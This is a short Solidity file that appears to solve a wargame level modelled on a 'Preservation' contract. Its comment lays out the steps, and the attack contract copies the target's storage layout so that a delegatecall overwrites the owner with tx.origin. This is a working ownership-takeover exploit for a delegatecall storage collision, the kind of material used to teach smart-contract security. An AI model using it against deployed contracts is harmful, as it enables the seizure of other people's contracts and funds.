// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

/**
 * @Solution
 * 1. Implement Attack contract that map their slot with Prevention contract
 * 2. Set Attack contract address to timeZone1Library via delegatecall -> send _timeStamp as Attack contract address to setFirstTime() or setSecondTime()
 * 3. Attack by calling setFirstTime() again.
 */

contract PreservationHack {

  address public temp1; 
  address public temp2; 
  address public owner; 
  uint storedTime; 

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}